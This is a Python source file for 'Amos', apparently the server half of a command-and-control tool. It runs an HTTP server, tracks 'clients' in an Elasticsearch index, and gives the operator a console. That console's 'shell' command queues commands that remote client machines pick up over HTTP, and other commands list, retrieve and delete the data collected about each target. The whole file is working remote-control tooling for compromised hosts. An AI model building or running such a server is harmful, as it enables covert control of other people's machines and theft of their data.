import threading
from HttpHandler import MyHandler
from http.server import HTTPServer
from server_settings import SERVER_IP, SERVER_PORT, ES_HANDLER, CONNECTED_CLIENTS


art = """

█████╗ ███╗   ███╗ ██████╗ ███████╗
██╔══██╗████╗ ████║██╔═══██╗██╔════╝
███████║██╔████╔██║██║   ██║███████╗
██╔══██║██║╚██╔╝██║██║   ██║╚════██║
██║  ██║██║ ╚═╝ ██║╚██████╔╝███████║
╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚══════╝
"""

print(art)


class Amos:

    def __init__(self):
        # Initialize the HTTP server but don't start it yet
        self.server = HTTPServer((SERVER_IP, SERVER_PORT), MyHandler)
        self.active_client = None;


    # display shell commands
    def show_commands(self):
        user_guide = """
            Amos Commands
                 'guide': [Display Amos user commands]
                 'clients':['Display clients within ES index']
                 'connected':['Display all active connection within ES index']
                 'shell (target ES Client_ID)':['selects a target and creates a session between the server and the client machine ']
                 'delete (target ES Client_ID)': ['remove specified document from index']
                 'delete all': ['remove all document from index']
                 'get (target ES Client_ID)': ['retrieves indexed data of specified target ']
                 'show fields (target ES Client_ID)': ['Displays existing field for specified target']
                 'field (target ES Client_ID) (FIELD NAME):  ['Displays specified field']
            """
        print(user_guide)


    def shell_interface(self):

        while True:
            cmd = input(MyHandler.convert_text("Amos: "))
            if cmd.strip() == "":
                pass
            elif cmd == 'connected':
                client_info = [ES_HANDLER.get_client_data(client_id) for client_id in CONNECTED_CLIENTS]
                ES_HANDLER.tabulate_data(client_info)

            elif cmd.strip() == "":
                pass 

            elif cmd.startswith('shell'):
                # Start session with the specified client
                target_client = cmd.split()[1]
                print(f"Starting session with {target_client}")
                self.active_client = target_client  # Set active client session

                # Enter interactive mode for continuous communication
                while True:
                    command = input(f"{target_client}: ")
                    if command.lower() == "exit":
                        print("Exiting shell session.")
                        self.active_client = None  # Clear active client
                        break
                    # Store or send command to be retrieved by `do_GET`
                    MyHandler.pending_command = command
                    # Optionally, wait for a response (if using async communication)

            elif cmd.strip() == "clients":
                cmd = cmd.strip().lower()
                ES_HANDLER.retrieve_client_information()

            elif cmd.strip() == "guide":
                cmd = cmd.strip().lower()
                self.show_commands()

            elif cmd.rstrip() == "delete all":
                cmd = cmd.strip().lower()
                ES_HANDLER.delete_all_docs()

            elif cmd.startswith('show fields'):
                cmd = cmd.split()

                if len(cmd) == 3:
                    client_id = cmd[2]
                    ES_HANDLER.show_fields(client_id)
                else:
                    print("[-]Invalid input!!!")

            elif 'get' in cmd:
                client_id = cmd[4:]
                ES_HANDLER.retrieve_client_document(client_id)

            elif cmd.startswith('fields'):
                cmd = cmd.split()

                if len(cmd) == 3:
                    client_id = cmd[1]
                    field_parameter = cmd[2]
                    ES_HANDLER.get_field(client_id, field_parameter)
                else:
                    print("[-]Invalid input!!!")

            elif cmd.startswith('delete'):
                cmd = cmd.split()

                if len(cmd) == 2:
                    doc_to_delete = cmd[1]
                    ES_HANDLER.delete_doc(doc_to_delete)
                else:
                    print("[-]Invalid input!!!")
            else:
                print("[-] Invalid command!!!")


    def start_http_server(self):
        # Start the HTTP server
        print(f"[*] Starting HTTP server on {SERVER_IP}:{SERVER_PORT} \n")
        self.server.serve_forever()


    def start(self):
        # Start the HTTP server in a separate thread
        server_thread = threading.Thread(target=self.start_http_server)
        server_thread.daemon = True  # Daemon thread will stop when the main program exits
        server_thread.start()

        # Start the shell interface in the main thread
        self.shell_interface()


if __name__ == '__main__':
    amos_server = Amos()
    amos_server.show_commands()
    amos_server.start()
